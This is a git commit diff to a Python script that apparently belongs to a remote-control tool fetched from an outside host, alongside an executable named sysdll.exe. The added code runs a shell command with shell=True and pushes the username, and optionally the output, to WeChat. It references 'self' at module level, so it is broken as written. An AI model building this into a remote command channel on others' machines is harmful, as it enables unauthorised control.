6554b6c93acc1670e887ab0c398321622cc13bd5
GCLgaici <141959309+GCLgaici@users.noreply.github.com>
2024-11-13 20:22:57 +0800

    go

--- Control_files/Change_Execution.py
+++ Control_files/Change_Execution.py
@@ -4,15 +4,21 @@ https://yc.052024.xyz/xz/sysdll.exe
 https://yc.052024.xyz/Control_files/Change_Execution.py
 """
 import os
-
 import subprocess
-import time
 
-# # 执行截图cx功能
-# os.system('start D:/Gaici/Remotely截屏.exe')
-
-
-
-# self.main.wechat_push.Alleged_information(f'电脑：{self.main.sys_username}在线')
-
+self.main.wechat_push.Alleged_information(f'{self.main.sys_username}命令代码')
+# 要执行的命令，这里以获取系统信息（systeminfo）为例
+command = "cd"
+# 使用run函数执行命令，通过shell=True在系统的shell中执行，需要注意安全问题
+try:
+    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    if result.returncode == 0:
+        print(result.stdout)
+        # self.main.wechat_push.Alleged_information(f'{result.stdout}')
+    else:
+        print(f"命令执行失败，错误信息: {result.stderr}")
+        # self.main.wechat_push.Alleged_information(f'{f"命令执行失败，错误信息: {result.stderr}"}')
+except Exception as e:
+    print(f"发生错误: {e}")
+    # self.main.wechat_push.Alleged_information(f"发生错误: {e}")
 
